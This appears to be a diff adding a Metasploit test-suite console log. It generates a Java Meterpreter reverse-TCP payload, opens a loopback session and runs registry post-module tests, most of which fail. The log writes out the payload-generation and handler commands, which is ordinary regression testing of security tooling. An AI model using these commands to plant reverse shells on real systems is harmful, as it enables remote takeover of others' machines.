@@ -1,0 +1,46 @@
+use java/meterpreter/reverse_tcp
+Stopping all jobs...
+msf6 post(test/railgun_reverse_lookups) > generate -o D:/a/_temp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220204-5712-qbb9m0.jar -f jar AutoVerifySessionTimeout=10 spawn=0 lport=6020 lhost=127.0.0.1
+msf6 payload(java/meterpreter/reverse_tcp) > [*] Writing 5265 bytes to D:/a/_temp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220204-5712-qbb9m0.jar...
+msf6 payload(java/meterpreter/reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 19
+msf6 payload(java/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6020 
+[*] Sending stage (58075 bytes) to 127.0.0.1
+[*] Meterpreter session 20 opened (127.0.0.1:6020 -> 127.0.0.1:50170 ) at 2022-02-04 03:05:15 +0000
+use test/registry
+msf6 post(test/registry) > run session=20 AddEntropy=true Verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session type: meterpreter
+[!]  * missing Meterpreter features: stdapi_registry_check_key_exists, stdapi_registry_create_key, stdapi_registry_delete_key, stdapi_registry_enum_key_direct, stdapi_registry_enum_value_direct, stdapi_registry_load_key, stdapi_registry_open_key, stdapi_registry_query_value_direct, stdapi_registry_set_value_direct, stdapi_registry_unload_key, stdapi_sys_config_getprivs
+[*] Running against session 20
+[*] Session type is meterpreter and platform is windows
+before running test: should evaluate key existence
+[-] FAILED: should evaluate key existence
+[*] PENDING: should evaluate value existence
+before running test: should read values
+[-] FAILED: should read values
+[-] Exception: NoMethodError : undefined method `[]' for nil:NilClass
+before running test: should return normalized values
+[-] FAILED: should return normalized values
+before running test: should enumerate keys and values
+[-] FAILED: should enumerate keys and values
+before running test: should create keys
+[-] FAILED: should create keys
+before running test: should write REG_SZ values
+[-] FAILED: should write REG_SZ values
+before running test: should write REG_DWORD values
+[-] FAILED: should write REG_DWORD values
+before running test: should delete keys
+[-] FAILED: should delete keys
+before running test: should create unicode keys
+[-] FAILED: should create unicode keys
+before running test: should write REG_SZ unicode values
+[-] FAILED: should write REG_SZ unicode values
+before running test: should delete unicode keys
+[-] FAILED: should delete unicode keys
+[*] Testing complete in 0.0642664
+[-] Passed: 1; Failed: 10
+[*] Post module execution completed
+msf6 post(test/registry) > 
